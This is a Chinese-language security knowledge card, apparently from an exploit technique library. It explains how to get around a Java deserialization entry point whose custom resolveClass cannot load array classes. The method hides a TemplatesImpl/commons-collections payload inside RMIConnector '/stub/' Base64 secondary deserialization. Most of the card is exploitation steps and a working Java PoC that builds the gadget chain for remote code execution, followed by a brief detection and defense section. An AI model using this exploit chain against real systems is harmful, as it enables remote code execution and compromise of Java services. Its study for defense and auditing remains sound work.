---
id: web-java-deser-resolveclass-urlclassloader-array-class-secondary-bypass
title: resolveClass 改用 URLClassLoader.loadClass 后数组类无法加载：用 RMIConnector 二次反序列化把 byte[][] 载荷藏进内层流
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: urlclassloader-resolveclass-array-class-rmiconnector-secondary-bypass
aliases:
- URLClassLoader.loadClass 不加载数组类
- resolveClass 数组类型 ClassNotFoundException
- buggyLoader
- '[[B 反序列化'
- 数组类黑名单绕过
tags:
- java
- deserialization
- resolveclass
- urlclassloader
- array-class
- rmiconnector
- secondary-deserialization
- templatesimpl
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V519
  verified_at: '2026-11-11T13:00:53+08:00'
  notes: 已对照原文全文与43张截图核对：img31确认入口 resolveClass 用 URLClassLoader.loadClass(desc.getName())；img33确认 Class.forName("[[B") 成功而 URLClassLoader.getSystemClassLoader().loadClass("[[B") 抛 ClassNotFoundException，卡中数组类限制原理成立；img25/26/27确认 findRMIServer 按 /stub/ 前缀分流、findRMIServerJRMP 内层 new ObjectInputStream(bin).readObject()；img28显示内层执行后外层抛 cannot be cast to RMIServer，与卡中 ClassCastException 说明一致；img29/34确认入口 readUTF("SJTU")+readInt(1896) 与 hex 传输、PoC 使用 TemplatesImpl+单InvokerTransformer+LazyMap/TiedMapEntry。dedup 候选 readobject-reflection-rmiconnector 与 serialkiller-cc7 均为黑名单漏类角度，与本卡数组类无法解析角度不同，非同链。说明：原文未给版本区间故 affected_versions 留空。
---

## 一句话结论

当反序列化入口重写 `resolveClass` 改用 `URLClassLoader.loadClass(desc.getName())` 加载类时，任何数组类型的类描述符（`[B`、`[[B`、`[Ljava.lang.Object;` 等）都会抛 `ClassNotFoundException`，导致 `TemplatesImpl._bytecodes`（`byte[][]`）、`ChainedTransformer`（`Transformer[]`）等依赖数组的 gadget 无法直接使用；此时可用 `RMIConnector` 的 `/stub/<base64>` 二次反序列化把带数组的 payload 藏进内层流——内层由 JDK 原生 `ObjectInputStream` 解析，`resolveClass` 走默认 `Class.forName`，数组类型可正常加载。

## 原理

- **默认 resolveClass 支持数组**：`ObjectInputStream.resolveClass(ObjectStreamClass desc)` 的默认实现是 `Class.forName(desc.getName(), false, loader)`；`Class.forName("[[B")` 会返回 `byte[][]` 的 Class 对象。
- **URLClassLoader.loadClass 不支持数组**：`ClassLoader.loadClass` 按二进制类名在 classpath 中查找类文件，不处理 JVM 的数组类型描述符；`URLClassLoader.getSystemClassLoader().loadClass("[[B")` 直接抛 `ClassNotFoundException: [[B`。若入口把 `resolveClass` 改成这种实现，序列化流中所有数组字段都会在类解析阶段失败。
- **哪些 gadget 会被数组卡住**：`TemplatesImpl` 的 `_bytecodes` 是 `byte[][]`；`ChainedTransformer` 的 `iTransformers` 是 `Transformer[]`；commons-collections 链中大量构造器/字段使用数组（`InstantiateTransformer` 的 `iParamTypes`/`iArgs` 等）。外层流一旦需要还原这些类型，就会在 `resolveClass` 抛异常。
- **为什么二次反序列化能绕过**：`RMIConnector.findRMIServerJRMP()` 把 `JMXServiceURL.urlPath` 中 `/stub/` 之后的 Base64 解码，并 `new ObjectInputStream(bin).readObject()`。这个新流是 JDK 原生实现（除非叠加 JVM 全局过滤器），`resolveClass` 是默认版本，数组类可以正常加载；因此把含数组的完整 payload 作为内层字节流藏进 Base64 字符串后，外层流中只出现 `RMIConnector`、`JMXServiceURL`、`InvokerTransformer`、`LazyMap` 等非数组类型。
- **外层触发方式**：`InvokerTransformer("connect", null, null)` 对任意对象调用无参 `connect()`；用 `HashMap → TiedMapEntry → LazyMap.get → InvokerTransformer.transform` 触发（`TiedMapEntry` 未被限制时）。`RMIConnector` 构造器 `RMIConnector(JMXServiceURL, Map)` 内部 stub 为 null，`connect()` 会走 `findRMIServer` 分支。
- **注意强转不影响利用**：`findRMIServerJRMP` 在 `readObject()` 之后会 `return (RMIServer) stub`，内层对象不是 `RMIServer` 时抛 `ClassCastException`，但此时内层反序列化已经执行完毕，命令/字节码已触发。

## 触发条件

- 反序列化入口自定义 `ObjectInputStream`，`resolveClass` 使用 `URLClassLoader.loadClass`/`ClassLoader.loadClass` 而非 `Class.forName`（常见于想用自定义类加载器过滤、却引入数组缺陷的实现）。
- 外层 gadget 必须能在不使用数组类型的前提下触发（如单个 `InvokerTransformer` + `LazyMap`/`TiedMapEntry`/`HashMap`）。
- classpath 保留 `javax.management.remote.rmi.RMIConnector`，且 `JMXServiceURL.urlPath` 可通过反射改写。
- 内层 sink 可用（如 TemplatesImpl 字节码加载、CC 链），且未启用 JEP 290 全局过滤/`SerialFilterFactory`（否则内层新流也会被过滤）。
- 攻击者能把按入口格式包装的序列化数据投递到目标（本例入口在流前还有 `readUTF`/`readInt` 前置校验）。

## 利用步骤

1. 逆向下发入口：确认 `resolveClass` 实现。若看到 `URLClassLoader.loadClass(desc.getName())`，直接构造含数组字段的常规链会在读取阶段 `ClassNotFoundException`。
2. 准备内层 payload（不受数组限制）：用 `TemplatesImpl`（`_bytecodes={evilBytes}`）+ `InvokerTransformer("newTransformer")` + `LazyMap` + `TiedMapEntry` + `HashMap` 组成完整原生链，或标准 CC6，序列化后 Base64。
3. 构造 `JMXServiceURL("service:jmx:rmi://")`，反射把 `urlPath` 设为 `"/stub/" + 内层Base64`，再 `new RMIConnector(url, null)`。
4. 构造外层载体：`LazyMap` + `TiedMapEntry(lazyMap, rmiConnector)` + `HashMap`，把 `lazyMap.factory` 设为 `InvokerTransformer("connect", null, null)`，序列化得到外层流。
5. 按入口格式补前置字段（如 `writeUTF("SJTU")`、`writeInt(1896)`），提交 hex/Base64 数据。
6. 反序列化时 `InvokerTransformer` 调 `connect()` → `findRMIServerJRMP` 解码 `/stub/` → 内层原生 OIS 加载数组类型与 TemplatesImpl 字节码 → 命令执行；若外层报 `ClassCastException: ... cannot be cast to RMIServer`，内层已执行，属正常现象。

## PoC

```java
// 内层：TemplatesImpl + 单 InvokerTransformer(newTransformer) + LazyMap/TiedMapEntry（可含 byte[][] 数组）
TemplatesImpl obj = new TemplatesImpl();
setField(obj, "_bytecodes", new byte[][]{evilBytes});   // 数组类型，只能出现在内层
setField(obj, "_name", "a");
setField(obj, "_tfactory", new TransformerFactoryImpl());

Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
Map lazy = LazyMap.decorate(new HashMap<>(), new ConstantTransformer(1));
TiedMapEntry tme = new TiedMapEntry(lazy, obj);
HashMap expMap = new HashMap<>();
expMap.put(tme, "test");
lazy.remove(obj);
setField(lazy, "factory", transformer);
String innerB64 = Base64.getEncoder().encodeToString(ser(expMap));

// 外层：RMIConnector(/stub/base64) + InvokerTransformer("connect")，无数组字段
JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://");
setField(url, "urlPath", "/stub/" + innerB64);
RMIConnector conn = new RMIConnector(url, null);

Map h = new HashMap<>();
Map lazy2 = LazyMap.decorate(h, new ConstantTransformer(1));
TiedMapEntry tme2 = new TiedMapEntry(lazy2, conn);
HashMap outer = new HashMap<>();
outer.put(tme2, "test");
lazy2.remove(conn);
setField(lazy2, "factory", new InvokerTransformer("connect", null, null));

// 按入口要求包装：writeUTF("SJTU") + writeInt(1896) + writeObject(outer)，再 hex 编码
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeUTF("SJTU");
oos.writeInt(1896);
oos.writeObject(outer);
oos.close();
System.out.println(hex(baos.toByteArray()));
```

## 变体与关联

- **SignedObject 同理**：`SignedObject.getObject()` 内部也是默认 `ObjectInputStream`，可替代 RMIConnector 作为二次反序列化桥（见 [[web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass]]）。
- **RMIConnector 触发方式变体**：`/stub/<base64>` 解析见 [[web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary]] 与 [[web-java-deser-readobject-reflection-rmiconnector-secondary]]；本卡解决的是数组类加载失败这一前置约束。
- **数组描述符排错**：若入口报 `ClassNotFoundException: [[B`/`[B`，几乎可以确定是 `resolveClass` 使用了非 `Class.forName` 的类加载方式；先确认报错类型再决定是否走本链。
- **内层 sink 可换**：内层标准 OIS 可加载任何被外层限制的类，包括 Junit/CC/Fastjson 等完整链。

## 检测与防御

- **检测**：审计自定义 `ObjectInputStream` 的 `resolveClass` 实现；序列化请求中出现 `/stub/` + 长 Base64、`RMIConnector`/`JMXServiceURL` 类；反序列化异常中出现 `ClassNotFoundException: [B`/`[[B`（探测行为）或 `cannot be cast to javax.management.remote.rmi.RMIServer`（利用成功的旁证）。
- **防御**：不要依赖自定义 `loadClass` 做安全校验；使用 JEP 290 `ObjectInputFilter` 白名单，并注册 `setSerialFilterFactory` 使所有新建 `ObjectInputStream`（含二次反序列化）继承全局策略；禁止 `SignedObject`/`RMIConnector` 等嵌套反序列化载体；升级 JDK 并限制 `javax.management`/Xalan 内部类可达性。
